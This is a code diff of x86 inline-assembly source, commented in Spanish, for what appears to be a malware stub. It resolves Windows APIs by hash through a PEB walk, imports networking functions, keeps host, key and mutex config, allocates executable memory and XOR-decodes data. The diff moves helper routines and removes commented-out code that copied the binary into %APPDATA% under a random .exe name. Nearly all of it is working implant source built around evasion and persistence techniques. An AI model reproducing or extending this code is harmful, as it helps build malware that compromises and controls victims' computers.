@@ -71,15 +71,13 @@ find_delta:
         *###############################################################################*/
 #pragma region hashes
 kernel32_symbol_hashes:
-        #define kernel32_count  8
+        #define kernel32_count  6
         API_DEFINE(LoadLibraryA, ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A'))
         API_DEFINE(GetProcAddress, ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s'))
         API_DEFINE(Sleep, ('S') ('l') ('e') ('e') ('p'))
         API_DEFINE(ExitProcess, ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s'))
         API_DEFINE(VirtualAlloc, ('V') ('i') ('r') ('t') ('u') ('a') ('l') ('A') ('l') ('l') ('o') ('c'))
         API_DEFINE(CreateMutexA, ('C') ('r') ('e') ('a') ('t') ('e') ('M') ('u') ('t') ('e') ('x') ('A'))
-        API_DEFINE(GetTempFileNameA, ('G') ('e') ('t') ('T') ('e') ('m') ('p') ('F') ('i') ('l') ('e') ('N') ('a') ('m') ('e') ('A'))
-        API_DEFINE(CopyFileA, ('C') ('o') ('p') ('y') ('F') ('i') ('l') ('e') ('A'))
 
 ws2_32_symbol_hashes:
         #define ws2_32_count    7
@@ -101,7 +99,6 @@ advapi32_symbol_hashes:
 #pragma endregion
 
 #pragma region VARS
-        VAR_DEFINE(APPDATA)
         VAR_DEFINE(pHOST)
         VAR_DEFINE(pKEY)
         VAR_DEFINE(pMUTEX)
@@ -114,6 +111,34 @@ advapi32_symbol_hashes:
         CALC_STACKSIZE()
 //¡¡¡¡CONSTANTES TEMPORALES!!!!
     __asm{
+#ifdef ERR_CHECK
+/*###############################################################################
+** gtfo:
+**    Método para salir en cualquier momento de la ejecución sin mostrar ningún
+**    error crítico, además es usado para tener una mejor idea de lo ocurrido
+*###############################################################################*/
+gtfo:
+        pop  edx
+        test eax, eax
+        jne  conti
+        call [ebp+_ExitProcess]
+conti:
+        add  esp, 0x4
+        push edx
+        ret
+#endif //ERR_CHECK
+CreateBuff:
+        cdq                             //EDX = 0
+        push PAGE_EXECUTE_READWRITE     //v
+        pushc(MEM_COMMIT)               //v
+        push eax                        //v
+        push edx                        //v
+        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+#ifdef ERR_CHECK
+        push ERR_MEM                    //v
+        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
+#endif //ERR_CHECK
+        ret
 over_hashes:
         //Saltamos sobre la configuración
         jmp  over_config
@@ -143,36 +168,6 @@ config_end:
 #pragma endregion
     __asm{
 over_config:
-        //Pasamos inicio real del código saltando sobre las funciones.
-        jmp  start
-#ifdef ERR_CHECK
-/*###############################################################################
-** gtfo:
-**    Método para salir en cualquier momento de la ejecución sin mostrar ningún
-**    error crítico, además es usado para tener una mejor idea de lo ocurrido
-*###############################################################################*/
-gtfo:
-        pop  edx
-        test eax, eax
-        jne  conti
-        call [ebp+_ExitProcess]
-conti:
-        add  esp, 0x4
-        push edx
-        ret
-#endif //ERR_CHECK
-CreateBuff:
-        cdq                             //EDX = 0
-        push PAGE_EXECUTE_READWRITE     //v
-        pushc(MEM_COMMIT)               //v
-        push eax                        //v
-        push edx                        //v
-        call [ebp+_VirtualAlloc]        //>VirtualAlloc(0, SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-#ifdef ERR_CHECK
-        push ERR_MEM                    //v
-        call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
-#endif //ERR_CHECK
-        ret
 start:
         /*###############################################################################
         ** Creación del stack de direcciones:
@@ -195,26 +190,6 @@ start:
         push 0x30                       //v
         pop  esi                        //v
         lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
-        /*###############################################################################
-        ** Obtención de %APPDATA%:
-        ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
-        ** recorremos el bloque de environments en busca de APPDATA=*
-        *###############################################################################
-        push eax                        //Guardamos EAX
-        push edi                        //Guardamos el Delta
-        mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
-        mov  edi, [eax+0x48]            //EDI = Environment
-        pushc(0x003D0041)               //v
-        pop eax                         //>EAX = "A\0=\0"
-redo:
-        dec edi                         //v
-        dec edi                         //> EDI-=2
-        scasd                           //¿[EDI] == EAX?; EDI+=4
-        jnz redo
-        mov  [ebp+_APPDATA], edi        //Almacenamos el puntero a APPDATA (UNICODE)
-        pop  edi                        //Recuperamos el Delta
-        pop  eax                        //Recuperamos EAX
-        */
         mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
@@ -313,37 +288,6 @@ xornext:
         call [ebp+_ExitProcess]
 nomtx:
 #endif //ERR_CHECK
-
-/*
-
-#pragma region MELT
-        push 0x7F                       //v
-        pop  eax                        //>EAX = 7F
-        call CreateBuff                 //Creamos Buffer para la ruta
-        mov  edi, eax                   //EDI = EAX
-        mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
-
-        //Copiamos %APPDATA% en el buffer
-copy_next:
-        lodsb                           //Cargamos byte
-        test al, al                     //¿Es cero?
-        jz copy_done                    //Si lo es hemos acabado...
-        stosb                           //Guardamos el byte
-        inc esi                         //Saltamos el byte Nulo
-        jmp copy_next                   //Siguiente carácter
-copy_done:
-        //Añadimos a %APPDATA% un nombre al azar.
-        cdq                             //EDX = 0
-        push edi                        //v
-        push edx                        //v
-        push edx                        //v
-        push edi                        //v
-        call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
-        mov  DWORD PTR[edi+5],'exe.'    //Reemplazamos la extensión a ".exe"
-
-#pragma endregion
-
-*/
 
 #define BUFF_SIZE 0x5000
 _cont:  xor  eax, eax                   //EAX = 0
